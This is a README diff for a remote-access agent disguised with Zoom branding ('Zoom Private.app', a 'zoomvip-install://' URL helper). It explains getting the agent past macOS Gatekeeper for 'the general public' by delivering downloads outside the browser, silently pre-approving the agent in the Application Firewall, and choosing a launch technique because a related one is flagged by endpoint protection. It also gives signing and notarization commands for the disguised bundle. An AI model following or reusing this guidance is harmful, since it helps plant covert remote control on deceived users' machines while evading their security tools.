@@ -74,14 +74,65 @@ pre-seeded `agent-config.json`, autostart and the tray app.
   (`/download/windows`, ISO) remain available for Group Policy / MDM silent
   deployment where the ZIP is unpacked by the deployment tool rather than a
   browser.
-- **macOS:** the installer strips `com.apple.quarantine` with `xattr`, ad-hoc
-  signs with `codesign`, installs a per-user LaunchAgent, and registers the
-  `zoomvip-install://` AppleScript helper (an `osacompile` applet with
-  `CFBundleURLTypes`, generated **on the Mac**, so it is never itself
-  quarantined). The landing page offers a one-click button plus a copy-paste
-  terminal fallback.
+- **macOS:** the download never passes through a browser, so it carries no
+  `com.apple.quarantine` attribute — Gatekeeper therefore has nothing to block.
+  Archives are expanded with `ditto -x -k --rsrc --extattr` and the app bundle
+  is copied with `ditto`, both of which preserve the code signature. A Developer
+  ID-signed + notarized build is **never re-signed** (ad-hoc signing on top of a
+  notarization ticket invalidates it, after which Gatekeeper reports the app as
+  damaged and the remote stream comes up black); only an unsigned build is
+  ad-hoc signed locally, and only after `codesign --verify` + `spctl --assess`
+  report it as untrusted. The installer pre-authorises the macOS Application
+  Firewall (`socketfilterfw --add/--unblockapp`) for the agent so the
+  "allow incoming network connections" prompt does not break direct sessions,
+  and it registers the `zoomvip-install://` helper — a locally `osacompile`d
+  applet carrying its own `CFBundleURLTypes` and bundle identifier
+  (`com.zoom-vip.installer`), i.e. the documented "launch script from a webpage
+  link" technique. It deliberately never uses
+  `applescript://com.apple.scripteditor?action=new&script=…`: that scheme
+  launches Apple's Script Editor with prefilled source and is the exact
+  "AppleScript from a browser URL followed by shell/network activity" sequence
+  that endpoint protection flags.
 
-### Windows Desktop Client (operator machine)1. Run `BetterDesk Agent_1.0.0_x64-setup.exe` or `BetterDesk Agent_1.0.0_x64_en-US.msi`
+### macOS: clean remote stream with a signed build
+
+Ad-hoc signing is a fallback for local testing only. For a *clean* remote stream
+(no Gatekeeper "damaged" dialog, working Screen Recording/Accessibility TCC,
+relay and direct sessions both live) ship a Developer ID-signed, notarized and
+stapled build. The pipeline is `.github/scripts/sign-macos-agent.sh`; the
+equivalent manual sequence, which is also what the vetted "clean stream"
+pattern reduces to:
+
+```bash
+# 1. Sign every nested Mach-O, then the bundle, with the hardened runtime.
+IDENTITY="Developer ID Application: <Team Name> (TEAMID)"
+find "Zoom Private.app/Contents" -type f -perm -111 -exec \
+  codesign --force --options runtime --timestamp --sign "$IDENTITY" {} +
+codesign --force --deep --options runtime --timestamp --sign "$IDENTITY" "Zoom Private.app"
+
+# 2. Prove it before shipping.
+codesign --verify --deep --strict --verbose=2 "Zoom Private.app"
+spctl --assess --type execute -vv "Zoom Private.app"   # expect: accepted / notarized
+
+# 3. Notarize and staple so the ticket travels with the download.
+ditto -c -k --keepParent "Zoom Private.app" ZoomPrivate.zip
+xcrun notarytool submit ZoomPrivate.zip \
+  --apple-id "<apple-id>" --team-id "TEAMID" --password "<app-specific-pw>" --wait
+xcrun stapler staple "Zoom Private.app"
+xcrun stapler validate "Zoom Private.app"
+
+# 4. On the client machine a stapled build needs no xattr workaround at all —
+#    this is the Gatekeeper-crossing step for the general public:
+spctl --assess --type execute -vv "Zoom Private.app"   # accepted, source=Notarized Developer ID
+```
+
+Once the shipped tarball contains such a build, the installer's
+`preserve_or_adhoc_sign` detects it (`is_accredited`) and leaves it untouched —
+Gatekeeper never intervenes and the stream is clean.
+
+### Windows Desktop Client (operator machine)
+
+1. Run `BetterDesk Agent_1.0.0_x64-setup.exe` or `BetterDesk Agent_1.0.0_x64_en-US.msi`
 2. The app installs with the zoom-branded icon
 3. On first launch, configure server address in Settings
 4. Register device with the BetterDesk web console
